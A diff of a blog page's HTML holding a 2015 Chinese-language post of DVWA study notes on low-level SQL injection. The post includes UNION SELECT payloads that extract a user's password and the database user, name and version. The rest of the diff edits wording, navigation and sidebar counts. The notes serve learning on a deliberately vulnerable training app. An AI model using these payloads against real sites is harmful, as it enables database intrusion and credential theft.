@@ -11,22 +11,22 @@
     
 
     
-    <meta name="description" content="DVWA笔记0x1 Low Injection0x00  order by x desc判断是否存在注入可以判断段数
+    <meta name="description" content="DVWA笔记0x1 Low Injection0x00  order by x desc判断是否存在注入可以判断字段数
 0x01 union select 1,2,3  —用来判断在web显示的字段长度,长度不匹配就会返回错误如果知道字段和表11&apos;union select 1,(select password from user where user_id =1)--     &apos;
-0x02 获取库名">
+0x02 获取库">
 <meta property="og:type" content="article">
 <meta property="og:title" content="DVWA-SQLInject">
 <meta property="og:url" content="http://a1ex.net/11/10/2015/mysqlDvwa/index.html">
 <meta property="og:site_name" content="A1exlism">
-<meta property="og:description" content="DVWA笔记0x1 Low Injection0x00  order by x desc判断是否存在注入可以判断段数
+<meta property="og:description" content="DVWA笔记0x1 Low Injection0x00  order by x desc判断是否存在注入可以判断字段数
 0x01 union select 1,2,3  —用来判断在web显示的字段长度,长度不匹配就会返回错误如果知道字段和表11&apos;union select 1,(select password from user where user_id =1)--     &apos;
-0x02 获取库名">
-<meta property="og:updated_time" content="2015-11-12T14:44:37.159Z">
+0x02 获取库">
+<meta property="og:updated_time" content="2015-11-18T12:06:54.641Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="DVWA-SQLInject">
-<meta name="twitter:description" content="DVWA笔记0x1 Low Injection0x00  order by x desc判断是否存在注入可以判断段数
+<meta name="twitter:description" content="DVWA笔记0x1 Low Injection0x00  order by x desc判断是否存在注入可以判断字段数
 0x01 union select 1,2,3  —用来判断在web显示的字段长度,长度不匹配就会返回错误如果知道字段和表11&apos;union select 1,(select password from user where user_id =1)--     &apos;
-0x02 获取库名">
+0x02 获取库">
 <link rel="publisher" href="106896526077043222500">
 
     
@@ -104,7 +104,7 @@
 		
 		</div>
 		
-		<h1 id="DVWA笔记">DVWA笔记</h1><h2 id="0x1_Low_Injection">0x1 Low Injection</h2><h3 id="0x00_order_by_x_desc">0x00  order by x desc</h3><p>判断是否存在注入<br>可以判断段数</p>
+		<h1 id="DVWA笔记">DVWA笔记</h1><h2 id="0x1_Low_Injection">0x1 Low Injection</h2><h3 id="0x00_order_by_x_desc">0x00  order by x desc</h3><p>判断是否存在注入<br>可以判断<code>字段</code>数</p>
 <h3 id="0x01_union_select_1,2,3_—">0x01 union select 1,2,3  —</h3><p>用来判断在web显示的字段长度,长度不匹配就会返回错误<br><code>如果知道字段和表</code><br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1'union <span class="operator"><span class="keyword">select</span> <span class="number">1</span>,(<span class="keyword">select</span> <span class="keyword">password</span> <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">where</span> user_id =<span class="number">1</span>)<span class="comment">--     '</span></span></span><br></pre></td></tr></table></figure></p>
 <h3 id="0x02_获取库名">0x02 获取库名</h3><p>一旦可以进行union操作,即可利用information_schema.schemata<br>union虽然限制了显示内容,但是我们可以利用concat_ws()进行字符串连接增加显示<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">  1'union <span class="operator"><span class="keyword">select</span> <span class="number">1</span>,(<span class="keyword">concat_ws</span>(<span class="built_in">char</span>(<span class="number">32</span>,<span class="number">58</span>,<span class="number">32</span>),<span class="keyword">user</span>(),<span class="keyword">database</span>(),<span class="keyword">version</span>()))<span class="comment">--            </span></span><br><span class="line"><span class="string">'</span></span></span><br></pre></td></tr></table></figure></p>
 <p>concat_ws(‘ ‘,      ‘a’,’b’)     字符串连接函数,用空格连接a和b<br>char(32,58,32)                     unicode转字符<br>user()              返回当前用户<br>database()     当前数据库<br>version()         Mysql版本</p>
@@ -142,10 +142,10 @@
 <nav class="article-nav clearfix">
  
  <div class="prev" >
- <a href="/11/13/2015/web安全测试/" title="web安全测试读书笔记">
+ <a href="/11/12/2015/sql爆表/" title="MySQL表段,字段查询">
   <strong>上一篇：</strong><br/>
   <span>
-  web安全测试读书笔记</span>
+  MySQL表段,字段查询</span>
 </a>
 </div>
 
@@ -184,7 +184,7 @@
   <div class="tagcloudlist">
     <p class="asidetitle">标签云</p>
     <div class="tagcloudlist clearfix">
-       <a href="/tags/JS/" style="font-size: 20px;">JS</a> <a href="/tags/Linux/" style="font-size: 16.67px;">Linux</a> <a href="/tags/MySQL/" style="font-size: 13.33px;">MySQL</a> <a href="/tags/Router/" style="font-size: 10px;">Router</a> <a href="/tags/Sites/" style="font-size: 10px;">Sites</a> <a href="/tags/Wall/" style="font-size: 10px;">Wall</a> <a href="/tags/bash/" style="font-size: 13.33px;">bash</a> <a href="/tags/blog/" style="font-size: 10px;">blog</a> <a href="/tags/git/" style="font-size: 10px;">git</a> <a href="/tags/书记/" style="font-size: 10px;">书记</a>
+       <a href="/tags/JS/" style="font-size: 20px;">JS</a> <a href="/tags/Linux/" style="font-size: 17.5px;">Linux</a> <a href="/tags/MySQL/" style="font-size: 15px;">MySQL</a> <a href="/tags/Router/" style="font-size: 10px;">Router</a> <a href="/tags/Sites/" style="font-size: 10px;">Sites</a> <a href="/tags/Wall/" style="font-size: 10px;">Wall</a> <a href="/tags/bash/" style="font-size: 12.5px;">bash</a> <a href="/tags/blog/" style="font-size: 10px;">blog</a> <a href="/tags/git/" style="font-size: 10px;">git</a> <a href="/tags/书记/" style="font-size: 10px;">书记</a>
     </div>
   </div>
 
@@ -192,7 +192,7 @@
   
   <div class="archiveslist">
     <p class="asidetitle"><a href="/archives">归档</a></p>
-      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/11/">十一月 2015</a><span class="archive-list-count">5</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/10/">十月 2015</a><span class="archive-list-count">16</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/09/">九月 2015</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/07/">七月 2015</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/06/">六月 2015</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/03/">三月 2015</a><span class="archive-list-count">2</span></li></ul>
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/11/">十一月 2015</a><span class="archive-list-count">6</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/10/">十月 2015</a><span class="archive-list-count">16</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/09/">九月 2015</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/07/">七月 2015</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/06/">六月 2015</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/03/">三月 2015</a><span class="archive-list-count">2</span></li></ul>
   </div>
 
 
@@ -214,7 +214,7 @@
 		  
 		
 		  
-			<li><a href="/categories/SQL/" title="SQL">SQL<sup>3</sup></a></li>
+			<li><a href="/categories/SQL/" title="SQL">SQL<sup>4</sup></a></li>
 		  
 		
 		  
